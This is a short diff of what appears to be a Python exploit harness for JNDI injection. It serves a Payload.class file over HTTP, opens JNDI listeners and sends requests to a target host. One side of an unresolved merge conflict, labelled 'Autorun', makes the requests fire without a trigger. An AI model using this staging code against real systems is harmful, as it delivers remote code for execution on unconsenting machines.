@@ -163,12 +163,16 @@ if __name__ == "__main__":
 
     httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
     httpd.add_route('/', 'Welcome')
+<<<<<<< HEAD
     payload_path = pathlib.Path(pathlib.Path.cwd(), 'Payload.class')
     httpd.add_route('/payload', open(payload_path, 'rb').read())
     httpd.set_event('run', when=triggers.PathContains('send-requests'))
+=======
+    httpd.add_route('/payload', open(os.path.join(os.path.dirname(__file__), 'Payload.class'), 'rb').read())
+>>>>>>> 39b0cc0 (Autorun)
 
     story.debug()
     for port in JNDI_PORTS:
         JNDI(story, address=context['rhost'], port=port)
-    story.add_scene(send_requests, when='run')
+    story.add_scene(send_requests)
     story.play()
